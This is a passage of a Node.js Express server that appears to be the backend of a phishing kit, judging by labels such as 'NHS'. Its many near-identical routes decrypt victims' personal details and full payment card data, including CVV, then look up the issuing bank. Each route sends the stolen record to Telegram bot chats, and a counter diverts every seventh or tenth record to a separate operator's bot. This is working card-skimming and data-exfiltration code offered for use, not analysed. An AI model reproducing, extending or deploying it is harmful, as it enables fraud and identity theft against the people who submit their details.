    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=NHS3:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1715235543&text=NHS3:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/stillrunning', cors())

app.post('/stillrunning', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSStillRunning:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1065375205&text=NHS:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1368320362&text=NHS:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/@kworthy12', cors())

app.post('/@kworthy12', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=NHS4:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1955185965&text=NHS4:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/Tarrifi', cors())

app.post('/Tarrifi', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSTarrifi:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=937419988&text=NHS:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/littlewaynesjobs', cors())

app.post('/littlewaynesjobs', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSWayne:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1532191460&text=NHS:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/sendKelvFriendRes', cors())

app.post('/sendKelvFriendRes', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=NHS:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5231391571&text=NHS:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});


let fpaysC = 3;

app.options('/sendFpays2', cors())

app.post('/sendFpays2', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (fpaysC == 10) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            fpaysC = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSFPays:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=NHS:\n${originalText}`
            );
            fpaysC += 1;
        }

        res.send("Update Completed");
    })
});

let masterboy = 0;

app.options('/M4STERB0Y', cors())

app.post('/M4STERB0Y', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (masterboy == 10) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            masterboy = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSMasterboy:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1465132165&text=NHS:\n${originalText}`
            );
            masterboy += 1;
        }

        res.send("Update Completed");
    })
});

let skiii719 = 0;

app.options('/skiii719', cors())

app.post('/skiii719', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (skiii719 == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            skiii719 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSSkii:\n${originalText}`
            );
            skiii719 += 1;
        }

        res.send("Update Completed");
    })
});

let Tcapz688 = 0;

app.options('/Tcapz688', cors())

app.post('/Tcapz688', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (skiii719 == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            skiii719 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSFZ:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1612469030&text=NHS:\n${originalText}`
            );
            skiii719 += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/actualTcapz688', cors())

app.post('/actualTcapz688', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (skiii719 == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            skiii719 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSSkii:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=NHS:\n${originalText}`
            );
            skiii719 += 1;
        }

        res.send("Update Completed");
    })
});

let mannyman789 = 0;

app.options('/mannyman789', cors())

app.post('/mannyman789', (req, res) => {
    firstname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
    lastname = CryptoJS.AES.decrypt(req.body.lname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = req.body.userAgent;
    ip = req.body.ip;
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (mannyman789 == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            mannyman789 = 0;
        } else {
            axios.post(
